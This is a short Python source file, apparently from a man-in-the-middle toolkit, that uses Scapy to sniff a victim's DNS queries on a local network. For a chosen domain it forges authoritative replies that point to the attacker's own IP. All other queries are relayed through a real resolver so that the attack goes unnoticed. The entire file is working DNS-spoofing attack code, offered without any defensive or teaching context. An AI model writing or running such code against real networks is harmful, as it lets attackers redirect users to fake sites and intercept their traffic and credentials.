from scapy.all import Ether, IP, UDP, DNS, DNSQR, DNSRR, sniff, sendp, sr1, get_if_hwaddr

def dns_spoof(pkt, target_ip, target_mac, local_ip, interface, domain, dns_server, timeout=1):
    """
    Continuously forges replies to DNS address queries for the target domain.
    For all other domains, forwards the DNS request to the given real DNS server and relays the response to the victim.
    """
    if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0 and pkt[IP].src == target_ip):
        return

    qname = pkt[DNSQR].qname.decode().strip(".")
    clean_domain = domain.replace("http://", "").replace("https://", "").rstrip("/")

    if qname == clean_domain or qname.endswith("." + clean_domain):
        
        print(f"Intercepted DNS query for {qname}. Sending spoofed answer ({local_ip}).")
        forged = (
            Ether(dst=target_mac, src=get_if_hwaddr(interface)) /
            IP(dst=pkt[IP].src, src=pkt[IP].dst) /
            UDP(dport=pkt[UDP].sport, sport=53) /
            DNS(
                id=pkt[DNS].id,
                qr=1,
                aa=1,
                qd=pkt[DNS].qd,
                an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=local_ip),
            )
        )

        sendp(forged, iface=interface, verbose=0)
    else:
        try:
            upstream_query = IP(dst=dns_server) / UDP(dport=53, sport=pkt[UDP].sport) / pkt[DNS]
            reply = sr1(upstream_query, timeout=timeout, verbose=0)
            if reply and reply.haslayer(DNS):
                
                relay = (
                    Ether(dst=target_mac, src=get_if_hwaddr(interface)) /
                    IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                    UDP(dport=pkt[UDP].sport, sport=53) /
                    reply[DNS]
                )

                sendp(relay, iface=interface, verbose=0)
        except Exception as exc:
            print(f"Could not relay DNS query for {qname}: {exc}")

def start_dns_sniffing(target_ip, target_mac, local_ip, interface, domain, dns_server, sniff_timeout=120):
    """
    Starts sniffing for DNS requests on the specified interface and handles them.
    """
    print(f"Listening for DNS requests on {interface}...")
    sniff(
        iface=interface,
        filter="udp port 53",
        prn=lambda pkt: dns_spoof(pkt, target_ip, target_mac, local_ip, interface, domain, dns_server),
        store=0,
        timeout=sniff_timeout
    )